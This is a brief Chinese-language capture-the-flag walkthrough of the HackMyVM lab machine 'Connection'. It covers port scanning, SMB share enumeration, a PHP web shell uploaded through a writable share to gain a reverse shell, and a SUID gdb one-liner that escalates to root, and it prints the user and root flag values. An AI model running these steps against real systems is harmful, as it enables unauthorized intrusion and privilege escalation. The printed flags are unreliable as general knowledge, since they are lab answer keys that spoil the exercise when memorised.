# Connection

2024-11-04 https://hackmyvm.eu/machines/machine.php?vm=Connection

## IP

192.168.5.40

## Scan

```
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

先看 samba 服务：

```
smbclient -L //192.168.5.40/
```

发现目录 share， smbclient -N //192.168.5.40/share/ 进入后，看到目录中有 html/index.html 文件，对应的是 80 web 服务的首页文件。并且有权限能够上传文件，直接上传一个 php 的 web shell，然后访问获得反弹 shell 链接。

先获得了 user flag：

```
www-data@connection:/home/connection$ pwd
/home/connection

www-data@connection:/home/connection$ cat local.txt
3f491443a2a6aa82bc86a3cda8c39617
```

sudo 没有发现信息，查找 suid 提权路径，发现 gdb，进行利用：

```
gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
```

最终获得了 root flag：

```
id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
cd /root
ls
proof.txt
cat proof.txt
a7c6ea4931ab86fb54c5400204474a39
```
